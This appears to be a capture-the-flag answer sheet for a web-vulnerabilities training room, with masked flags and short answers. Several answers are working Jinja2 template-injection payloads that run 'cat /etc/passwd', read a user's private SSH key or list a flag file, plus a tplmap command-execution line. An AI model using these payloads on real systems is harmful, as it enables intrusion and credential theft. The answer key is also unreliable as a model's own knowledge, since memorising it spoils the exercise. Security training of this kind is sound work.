# ZTH: Obscure Web Vulns

- Read the Intro.

	  no answer needed

- Read the above!

	  no answer needed

- Read the above.

	  no answer needed

- How would a hacker(you :) ) cat out /etc/passwd on the server(using cat with the rce payload)

	- `{{config.__class__.__init__.__globals__['os'].popen("cat /etc/passwd").read()}}`

- What about reading in the contents of the user test's private ssh key.(use the read file one not the rce one)

	- `{{ ''.__class__.__mro__[2].__subclasses__()[40]()(/home/test/.ssh/id_rsa).read()}}`

- How would I cat out /etc/passwd using tplmap on the ip:port combo 10.10.10.10:5000, with the vulnerable param "noot".

	- `tplmap -u http://10.10.10.10:5000/ -d 'noot' --os-cmd "cat /etc/passwd"`

- What is the flag?

	- `{{config.__class__.__init__.__globals__['os'].popen("ls /flag").read()}}`
	- Read the flag using this command
	- `********`

- Read the above.

	  no answer needed

- Read the above.

	  no answer needed

- What parameter allows us to generate a POC(actual exploit)

	- `--malicious`

- Earn that cookie!

	  no answer needed

- Read the above.

	  no answer needed

- Read the above.

	  no answer needed

- Read the above.

	 no answer needed

- What is the flag?

	- `noot****************`

- Remember to read the RFC when your developing a library.

	  no answer needed

- Read the above.

	  no answer needed

- Read the above

	  no answer needed

- What is the flag?

	- `*********noot`

- Read the above.

	  no answer needed

- Read the above.

	  no answer needed

- Read the above.

	  no answer needed

- How many users are on the system?

	- `31`

- What is the name of the user with a UID of 1000?

	- `p**a`

- Read the above.

	  no answer needed

- Read the above

	  no answer needed

- What is the secret?

	- [c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker)
	- `****`

- Update me..

	  no answer needed

